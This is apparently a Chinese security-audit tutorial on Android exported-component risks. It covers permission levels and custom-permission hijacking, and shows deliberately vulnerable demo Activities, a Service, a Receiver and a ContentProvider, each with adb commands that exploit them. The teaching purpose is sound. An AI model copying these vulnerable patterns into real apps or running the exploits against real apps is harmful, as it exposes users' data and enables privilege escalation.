# Android移动安全第一章_组件导出安全
> QIANXIN Team
> 来源：https://forum.butian.net/share/4814

> 系列目录：
> 
> 1.  Android 组件导出安全（本章）
> 2.  Android Intent 安全
> 3.  Android Binder 服务安全
> 4.  Android ContentProvider 安全
> 5.  Android WebView 安全
> 6.  Android UI 欺骗与钓鱼
> 7.  Android Deep Link 安全
> 8.  Android 广播安全
> 9.  Android PendingIntent 安全
> 10.  Android 系统设置安全
> 11.  Android SSRF 与网络安全
> 12.  Android 加密与数据存储安全
> 13.  Android 认证与证书校验
> 14.  Android Zip Slip 路径遍历
> 15.  Android Fragment Injection
> 16.  Android SELinux 与沙箱机制

* * *

## 1\. 前言

Android 应用由四大组件构成：

-   Activity：负责用户界面展示，一个屏幕页面通常对应一个 Activity
-   Service：在后台执行长时间运行的操作，没有用户界面
-   BroadcastReceiver：接收系统或应用发出的广播消息并做出响应
-   ContentProvider：管理应用数据的共享访问，为其他应用提供结构化的数据读写接口

每个组件都可以选择"导出"（exported），即允许其他应用访问。

这个机制是 Android 进程间通信（IPC，Inter-Process Communication）的基础设计，没有它应用之间无法协作。但一旦组件被导出，它就暴露在设备上所有已安装应用的访问范围内。比如一个系统 App 的导出组件，可能就成了普通应用提权到系统权限的跳板。

从实际漏洞来看，Android 客户端安全问题的大部分入口都和组件导出有关——要么是不该导出的组件被导出了，要么是导出的组件缺少足够的访问控制。后续文章会讲到的 Intent 重定向、WebView 任意 URL 加载、ContentProvider 数据泄露、Binder 服务未授权调用等，追根溯源都建立在组件导出这个前提上。

本文面向有 Android 开发基础、想入门安全审计的读者，讲解组件导出的机制、攻击面和审计方法。

* * *

## 2\. 四大组件导出机制详解

### 2.1 显式导出 vs 隐式导出

组件是否导出由 AndroidManifest.xml（应用的配置清单文件，声明了应用的所有组件、权限和元数据）中的 `android:exported` 属性控制：

```xml

<activity
    android:name=".PaymentActivity"
    android:exported="true" />


<activity
    android:name=".InternalSettingsActivity"
    android:exported="false" />
```

但还存在"隐式导出"的情况。当组件声明了 `<intent-filter>`（Intent 过滤器，用于声明组件能响应哪些类型的 Intent 请求）时，在 Android 12 之前，系统会自动将其视为 exported=true：

```xml

<activity android:name=".ShareActivity">
    <intent-filter>
        <action android:name="android.intent.action.SEND" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

这是历史上不少组件被意外导出的原因之一。

### 2.2 android:exported 的默认值规则

| 条件 | Android 12 之前 (targetSdk < 31) | Android 12+ (targetSdk >= 31) |
| --- | --- | --- |
| 有 intent-filter 且未声明 exported | 默认 true（自动导出） | 编译报错，必须显式声明 |
| 无 intent-filter 且未声明 exported | 默认 false | 默认 false |
| 显式声明 exported=true | 导出 | 导出 |
| 显式声明 exported=false | 不导出 | 不导出 |

Android 12 的这个改动是一次不错的安全改进，强制开发者明确意图。但对于系统预装 App（很多 targetSdk 仍然较低）和厂商定制组件，隐式导出的问题依然存在。

### 2.3 特殊情况：ContentProvider 的默认导出

ContentProvider 的默认导出规则和其他三个组件不同：

| targetSdk | 默认 exported 值 |
| --- | --- |
| < 17 (Android 4.2 之前) | true |
| >= 17 | false |

这意味着极老的应用（targetSdk < 17）的 ContentProvider 默认就是导出的，即使没有声明 intent-filter。现在已经很少见，但在审计遗留系统时仍需注意。

* * *

## 3\. 权限保护机制

组件导出不等于完全暴露。Android 提供了多层权限保护机制来限制谁可以访问导出的组件。

### 3.1 Manifest 层：android:permission 属性

最直接的保护方式是在组件声明中指定权限：

```xml
<permission
    android:name="com.example.permission.ACCESS_SENSITIVE"
    android:protectionLevel="signature" />
<service
    android:name=".SensitiveService"
    android:exported="true"
    android:permission="com.example.permission.ACCESS_SENSITIVE" />
```

调用方必须在自己的 Manifest 中声明并获得该权限，否则调用时会抛出 SecurityException（安全异常，表示调用被系统拒绝）。

对于 ContentProvider，还有更细粒度的读写权限：

```xml
<provider
    android:name=".UserDataProvider"
    android:exported="true"
    android:readPermission="com.example.permission.READ_DATA"
    android:writePermission="com.example.permission.WRITE_DATA" />
```

### 3.2 四种 protectionLevel

自定义权限的安全性取决于它的 protectionLevel（保护级别），这个属性决定了系统在什么条件下授予该权限：

| protectionLevel | 授予条件 | 安全性 |
| --- | --- | --- |
| normal | 安装时自动授予，无需用户确认 | 低，任何 App 声明即可获得 |
| dangerous | 需要用户运行时授权 | 中，用户可能盲目同意 |
| signature | 必须与声明权限的 App 使用相同证书签名 | 高，第三方 App 无法获得 |
| signatureOrSystem | 相同签名或系统预装 App | 高 |

值得注意的是，如果一个导出组件仅靠 normal 级别的自定义权限保护，那和没保护差别不大。恶意 App 只需在 Manifest 中声明 `<uses-permission>` 就能自动获得。

### 3.3 自定义权限的抢注风险

Android 的自定义权限有一个容易被忽略的特性：权限的 protectionLevel 由先安装的 App 定义。

假设目标 App 定义了一个 signature 级别的权限：

```xml

<permission
    android:name="com.victim.permission.SENSITIVE"
    android:protectionLevel="signature" />
```

如果恶意 App 先于目标 App 安装，并抢先定义同名权限为 normal 级别：

```xml

<permission
    android:name="com.victim.permission.SENSITIVE"
    android:protectionLevel="normal" />
<uses-permission android:name="com.victim.permission.SENSITIVE" />
```

那么系统会采用先安装者的定义（normal），恶意 App 就能获得该权限。这个问题在 Android 12+ 上有所缓解（同名权限冲突时安装会失败），但在低版本系统上仍然有效。

### 3.4 代码层权限校验

Manifest 层的权限保护相当于在门口放了个门卫，但很多场景需要在代码中做更精细的校验。

Android 的 Binder 机制（系统底层的跨进程通信框架，后续文章会详细讲）在每次跨进程调用时会记录调用者的 UID 和 PID，服务端可以通过这些信息判断"谁在调用我"：

```java

int result = checkCallingPermission("android.permission.DUMP");
if (result != PackageManager.PERMISSION_GRANTED) {
    throw new SecurityException("Permission denied");
}


int callingUid = Binder.getCallingUid();
if (callingUid >= 10000) {  
    throw new SecurityException("Only system apps allowed");
}


String[] packages = getPackageManager().getPackagesForUid(Binder.getCallingUid());
if (!Arrays.asList(packages).contains("com.trusted.app")) {
    throw new SecurityException("Unauthorized caller");
}
```

在审计中，代码层校验的缺失是常见的漏洞成因。组件导出了，Manifest 没加权限，代码里也没检查调用者身份，三层防线全部缺失。

#### 演示：权限保护 vs 无保护

作为对比，同一个 Demo App 中有一个 SecureActivity，虽然 exported=true，但配置了系统签名级权限：

```xml
<activity
    android:name=".SecureActivity"
    android:exported="true"
    android:permission="android.permission.MANAGE_USERS" />
```

尝试从外部启动：

```bash
adb shell am start -n com.demo.exportedcomponents/.SecureActivity
```

输出：

```php
Exception occurred while executing 'start':
java.lang.SecurityException: Permission Denial: starting Intent { ... }
    requires android.permission.MANAGE_USERS
```

系统直接拒绝了调用，抛出 SecurityException。这就是 signature 级别权限保护的效果——即使组件导出了，没有对应签名的 App 也无法访问。和后面第 4 节中那些无保护的组件形成了鲜明对比。

* * *

## 4\. 四大组件的攻击面

### 4.1 Activity

Activity 是用户界面组件，也是最常被导出的组件类型。

攻击入口：`startActivity()` / `startActivityForResult()`

可控参数：Intent 中的 extras。Intent 是 Android 组件之间传递消息的载体，extras 是附带在 Intent 上的键值对数据（字符串、整数、Parcelable 对象等），由调用方自由填写。

典型攻击模式：

| 模式 | 原理 | 危害 |
| --- | --- | --- |
| UI 内容注入 | Activity 从 Intent extras 读取字符串直接显示到 UI | 伪造系统弹窗，钓鱼 |
| Intent 重定向 | Activity 从 extras 取出嵌套 Intent 后调用 startActivity | 以受害 App 身份启动任意组件 |
| WebView URL 注入 | Activity 从 extras 读取 URL 传给 WebView.loadUrl() | 在受害 App 上下文中加载恶意网页 |
| 返回值劫持 | 恶意 App 通过 startActivityForResult 获取敏感返回数据 | 数据泄露 |

下面用配套的演示 App（com.demo.exportedcomponents）来展示其中两种模式。安装 APK 后，可以直接用 ADB 命令复现。

#### 演示：UI 内容注入

```java
public class VulnDisplayActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        showDialog(getIntent());
    }

    private void showDialog(Intent intent) {
        String title = intent.getStringExtra("title");
        String message = intent.getStringExtra("message");
        if (title == null) title = "通知";
        if (message == null) message = "暂无内容";

        new AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("确定", (d, w) -> finish())
            .setCancelable(false)
            .show();
    }
}
```

对应的 Manifest 声明：

```xml
<activity
    android:name=".VulnDisplayActivity"
    android:exported="true"
    android:label="系统通知" />
```

通过 ADB 注入伪造的"安全警告"弹窗：

```bash
adb shell am start -n com.demo.exportedcomponents/.VulnDisplayActivity \
    --es title "安全警告" \
    --es message "您的账户存在异常登录，请立即修改密码"
```

效果如下，弹窗的标题和内容完全由攻击者控制，用户很难区分这是应用自身的提示还是外部注入的：

![demo_ui_inject.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/02/attach-71a3e6ca368bd0635bf7fbedf6380bca002a8a4e.png)

#### 演示：Intent 重定向

另一个常见模式是 Intent 重定向。Activity 从 extras 中取出目标组件信息后直接构造 Intent 并启动，攻击者可以借此以该 App 的身份启动任意组件，包括未导出的内部 Activity：

```java
public class VulnRedirectActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        
        Intent nested = getIntent().getParcelableExtra("next_intent");
        if (nested != null) {
            startActivity(nested);  
            finish();
            return;
        }

        
        String targetPkg = getIntent().getStringExtra("target_package");
        String targetCls = getIntent().getStringExtra("target_class");
        if (targetPkg != null && targetCls != null) {
            Intent redirect = new Intent();
            redirect.setClassName(targetPkg, targetCls);
            startActivity(redirect);  
            finish();
            return;
        }
    }
}
```

通过 ADB 利用这个漏洞启动未导出的 InternalSecretActivity（exported=false）：

```bash
adb shell am start -n com.demo.exportedcomponents/.VulnRedirectActivity \
    --es target_package "com.demo.exportedcomponents" \
    --es target_class "com.demo.exportedcomponents.InternalSecretActivity"
```

成功绕过 exported=false 限制，打开了内部机密页面：

![demo_intent_redirect.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/02/attach-12cb869e7981b301789733781ff5b60729dbc0b9.png)

### 4.2 Service

Service 是后台服务组件，分为 Started Service 和 Bound Service 两种模式。

攻击入口：`startService()` / `bindService()`

可控参数：

-   Started Service：Intent extras（同 Activity）
-   Bound Service：AIDL 接口的所有方法参数。AIDL（Android Interface Definition Language）是 Android 定义跨进程调用接口的语言，类似于定义一个远程可调用的 Java 接口

典型攻击模式：

| 模式 | 原理 | 危害 |
| --- | --- | --- |
| 未授权功能触发 | startService 触发敏感操作（如修改系统设置） | 权限提升 |
| AIDL 方法调用 | bindService 后通过 AIDL 接口调用敏感方法 | 数据泄露、功能滥用 |
| 系统服务未授权访问 | 通过 ServiceManager 获取系统 Binder 服务 | 绕过权限模型 |

Bound Service 的攻击面比 Started Service 大得多。Started Service 只在启动时接收一次 Intent 数据，而 Bound Service 建立连接后，攻击者可以反复调用 AIDL 接口暴露的所有方法。如果这些方法内部没有做调用者校验，就等于把所有功能完全开放。

演示 App 中的 VulnService 展示了 Started Service 的未授权功能触发：

```java
public class VulnService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String filename = intent.getStringExtra("filename");
        String content = intent.getStringExtra("content");

        if (filename != null && content != null) {
            
            File file = new File(getFilesDir(), filename);
            FileWriter writer = new FileWriter(file);
            writer.write(content);
            writer.close();
        }
        stopSelf();
        return START_NOT_STICKY;
    }
}
```

Manifest 中无任何权限保护：

```xml
<service
    android:name=".VulnService"
    android:exported="true" />
```

通过 ADB 向应用沙箱写入任意文件：

```bash

adb shell am startservice -n com.demo.exportedcomponents/.VulnService \
    --es filename "config.txt" \
    --es content "malicious_data_injected_by_attacker"


adb shell run-as com.demo.exportedcomponents \
    cat /data/data/com.demo.exportedcomponents/files/config.txt
```

输出：

```php
malicious_data_injected_by_attacker
```

攻击者成功向应用私有目录写入了任意内容。实际场景中，这可能导致覆写应用配置文件、注入恶意数据等。

### 4.3 BroadcastReceiver

BroadcastReceiver 接收广播消息，分为静态注册（Manifest）和动态注册（代码）两种。

攻击入口：`sendBroadcast()` / `sendOrderedBroadcast()`

可控参数：Intent 中的 action、extras

典型攻击模式：

| 模式 | 方向 | 原理 | 危害 |
| --- | --- | --- | --- |
| 广播注入 | 攻击者到受害者 | 向导出的 Receiver 发送伪造广播 | 触发敏感逻辑 |
| 广播劫持 | 受害者到攻击者 | 注册高优先级 Receiver 拦截有序广播 | 数据窃取 |
| 隐式广播窃听 | 受害者到攻击者 | 监听未设置包名的隐式广播 | 信息泄露 |

注意区分"广播注入"和"广播劫持"。前者是攻击者主动发送广播给受害 App，后者是攻击者被动拦截受害 App 发出的广播。两个方向都值得关注。

演示 App 中的 VulnReceiver 展示了广播注入的效果：

```java
public class VulnReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        
        String data = intent.getStringExtra("log_data");
        if (data != null) {
            Log.i(TAG, "Received data: " + data);
            Toast.makeText(context,
                "收到广播数据: " + data, Toast.LENGTH_LONG).show();
        }
    }
}
```

Manifest 中声明了 intent-filter 且 exported=true：

```xml
<receiver
    android:name=".VulnReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="com.demo.exportedcomponents.ACTION_LOG" />
    </intent-filter>
</receiver>
```

通过 ADB 发送伪造广播：

```bash
adb shell am broadcast -n com.demo.exportedcomponents/.VulnReceiver \
    -a com.demo.exportedcomponents.ACTION_LOG \
    --es log_data "injected_by_attacker"
```

通过 logcat 确认 Receiver 收到了注入的数据：

```bash
adb logcat -s VulnReceiver
```

输出：

```php
I VulnReceiver: Received data: injected_by_attacker
```

应用直接信任并处理了攻击者注入的数据。实际场景中，这里的逻辑可能是执行命令、修改应用状态、或者触发其他敏感操作。

### 4.4 ContentProvider

ContentProvider 提供结构化数据访问接口，是 Android 跨应用数据共享的标准方式。

攻击入口：`ContentResolver.query()` / `insert()` / `update()` / `delete()` / `openFile()` / `call()`

可控参数：URI（统一资源标识符，格式为 `content://authority/path`，用于定位 Provider 中的数据）、selection、selectionArgs、projection、文件路径

典型攻击模式：

| 模式 | 原理 | 危害 |
| --- | --- | --- |
| 数据泄露 | query() 无权限保护，直接返回敏感数据 | 读取用户数据 |
| SQL 注入 | selection/projection 参数直接拼接到 SQL | 读取任意表数据 |
| 路径遍历 | openFile() 未过滤 ../ 可读取沙箱外文件 | 任意文件读取 |
| call() 方法滥用 | call() 方法执行敏感操作且无权限校验 | 功能滥用 |

ContentProvider 的 openFile() 路径遍历是一个比较经典的漏洞模式：

```java

@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    String path = uri.getLastPathSegment();  
    File file = new File(getContext().getFilesDir(), path);
    
    
    return ParcelFileDescriptor.open(file,
        ParcelFileDescriptor.MODE_READ_ONLY);
}
```

演示 App 中的 VulnProvider 展示了数据泄露的效果。query() 方法无权限保护，直接返回模拟的用户敏感数据：

```xml
<provider
    android:name=".VulnProvider"
    android:authorities="com.demo.exportedcomponents.provider"
    android:exported="true" />
```

通过 ADB 直接查询用户数据：

```bash
adb shell content query \
    --uri content://com.demo.exportedcomponents.provider/users
```

输出：

```php
Row: 0 id=1, username=zhang_san, email=zhangsan@example.com, phone=138xxxx1234
Row: 1 id=2, username=li_si, email=lisi@example.com, phone=139xxxx5678
Row: 2 id=3, username=wang_wu, email=wangwu@example.com, phone=137xxxx9012
```

三条用户记录（用户名、邮箱、手机号）被完整返回，任何 App 都可以读取。

* * *

## 5\. Android 版本演进对组件导出的影响

### 5.1 Android 12（API 31）：强制声明 exported

这是组件导出安全方面一次比较重要的改进。从 Android 12 开始，如果 App 的 targetSdkVersion >= 31，所有包含 intent-filter 的组件必须显式声明 android:exported 的值，否则无法安装。

这直接消除了"隐式导出"的问题。但需要注意：

-   系统预装 App 可能不受此限制（由厂商控制 targetSdk）
-   已安装的旧版 App 不受影响（只在安装时检查）
-   开发者可能为了省事直接全部设为 exported=true

### 5.2 Android 13+：更严格的 Intent 过滤

Android 13 引入了更严格的 Intent 匹配规则：

-   动态注册的 BroadcastReceiver 默认不接收外部 App 的广播，除非注册时指定 `RECEIVER_EXPORTED` 标志
-   对 PendingIntent（一种延迟执行的 Intent 包装，允许其他应用或系统在未来某个时刻代替你执行操作）的 mutability 要求更严格

```java

context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);

context.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED);
```

### 5.3 厂商定制 ROM 的额外攻击面

厂商定制的 Android ROM（如 HyperOS、EMUI、ColorOS 等）通常会在 AOSP 基础上添加大量自定义系统服务。这些服务有一个重要特点：

它们通过 `ServiceManager.addService()` 注册到系统的服务管理器中，不受 Manifest exported 属性约束。ServiceManager 是 Android 系统中管理所有 Binder 服务的中央注册表，类似于一个全局的服务电话簿。

任何 App 都可以通过 `ServiceManager.getService("service_name")` 从这个"电话簿"中查到服务地址，获取 Binder 代理对象，然后调用其 AIDL 方法。安全性完全依赖于服务内部的代码层权限校验。如果开发者忘了加 checkCallingPermission() 或 checkCallingUid()，就是一个可利用的漏洞。

这类服务运行在 system\_server 进程中（UID 1000，Android 系统中权限最高的用户态进程），一旦存在未授权访问，影响面远大于普通 App 组件。

* * *

## 6\. 总结

组件导出是 Android 安全的"门"。门开着不一定有问题，但门开着又没人看守，就是漏洞。

回顾一下：

-   intent-filter 会导致组件隐式导出（Android 12 之前）
-   normal 级别的自定义权限保护力度有限
-   四大组件各有不同的攻击模式，Activity 的 Intent 注入和 ContentProvider 的路径遍历比较常见
-   厂商自定义系统服务是一个容易被忽视的攻击面

apk文件  
通过网盘分享的文件：导出.apk  
链接: [https://pan.baidu.com/s/1AV9-lPs-3BtkNoN47GqhzQ?pwd=aubn](https://pan.baidu.com/s/1AV9-lPs-3BtkNoN47GqhzQ?pwd=aubn) 提取码: aubn
